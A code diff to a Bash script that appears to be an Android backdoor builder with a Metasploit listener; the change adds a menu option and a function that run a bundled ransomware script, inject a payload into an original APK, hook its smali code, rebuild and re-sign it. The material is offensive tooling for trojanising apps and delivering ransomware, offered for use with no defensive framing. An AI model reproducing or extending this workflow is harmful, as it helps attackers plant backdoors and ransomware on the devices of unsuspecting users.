@@ -951,11 +951,13 @@ function android(){
 	clear
 	baner
 	echo
-        printf "\033[31;1m[\033[32;1m1\033[31;1m]\033[37;1m backdoor android\n"
+        printf "\033[31;1m[\033[32;1m1\033[31;1m]\033[37;1m Backdoor Android\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m2\033[31;1m]\033[37;1m bind backdoor original dari template\033[31;1m\n"
+        printf "\033[31;1m[\033[32;1m2\033[31;1m]\033[37;1m Bind Backdoor original from template\033[31;1m\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m3\033[31;1m]\033[37;1m bind backdoor original dari file\033[31;1m [\033[32;1mBETA\033[31;1m]\n"
+        printf "\033[31;1m[\033[32;1m3\033[31;1m]\033[37;1m Bind Backdoor original from file\033[31;1m [\033[32;1mBETA\033[31;1m]\n"
+        sleep 0.025
+	printf "\033[31;1m[\033[32;1m4\033[31;1m]\033[37;1m Bind Backdoor + inject ransomware\033[31;1m [\033[32;1mBETA\033[31;1m]\n"
         sleep 0.025
         printf "\033[31;1m[\033[32;1m0\033[31;1m]\033[37;1m kembali\n\n"
         read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
@@ -972,6 +974,10 @@ function android(){
         	elif [ $xyz = "3"  ];
         	then
         	backdoor_file
+
+		elif [ $xyz = "4"  ];
+		then
+		backdoor_ransomware
 
 		elif [ $xyz = "0"  ];
 		then
@@ -1913,6 +1919,33 @@ function backdoor_file(){
         clear_data
         sleep 1
 }
+
+#fungsi backdoor + inject ransomware
+function backdoor_ransomware() {
+	#statements
+	clear
+	baner
+	echo
+	echo
+	pt=".data/ransomware"
+	cd $pt;python3 ransomware.py;cd ../..
+	sleep 5
+	sets_original
+	inject_payload
+	xyz
+	decompile_payload
+	decompile_original
+	perms
+	hook_smalies
+	sleep 1
+	rebuild_original
+	sleep 1
+	sign_orig
+	sleep 1
+	clear_data
+	sleep 1
+}
+
 
 # listerner metasploit
 function listerners(){
